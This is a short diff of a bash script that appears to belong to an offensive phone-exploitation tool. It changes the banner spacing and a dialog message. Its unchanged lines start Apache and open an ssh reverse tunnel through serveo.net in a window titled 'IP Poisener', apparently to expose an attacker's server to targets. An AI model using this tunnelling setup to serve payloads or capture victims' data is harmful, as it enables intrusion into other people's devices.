@@ -51,13 +51,13 @@ clear
          \__,_|_| |_|\__,_|_|  \___/| .__/|_|\___/|_|\__|
                             |_|                  
  "
-    echo -e "\n		     \033[0;36mAuthor $white: \033[1;32m@lytroths$nc"
-	echo -e "\n      		\e[44m$red[$green!$red]$white WARNING : Attacking Targets Without Prior  $red[$green!$red]$nc"
-	echo -e "     		\e[101m$blue[$green!$blue]$white  Consent Is Illegal And Punished By Law.   $blue[$green!$blue]$nc\n"
+        echo -e "\n      \033[0;36mAuthor $white: \033[1;32m@lytroths$nc"
+	echo -e "\n      \e[44m$red[$green!$red]$white WARNING : Attacking Targets Without Prior  $red[$green!$red]$nc"
+	echo -e "     	 \e[101m$blue[$green!$blue]$white  Consent Is Illegal And Punished By Law.   $blue[$green!$blue]$nc\n"
 }
 function server() {
 sudo service apache2 start
-whiptail --title "Warning" --msgbox "                            Hello World !!" 8 78
+whiptail --title "Warning" --msgbox "                            Hello Don't be scared !!" 8 78
 whiptail --title "Warning" --msgbox "                            Don't Close XTERM " 8 78
 	sleep 2
 	xterm -T "IP Poisener" -e "ssh -R 80:localhost:80 `echo -n $(date) | md5sum | cut -c1-8`@serveo.net 2> /dev/null > link.log" &
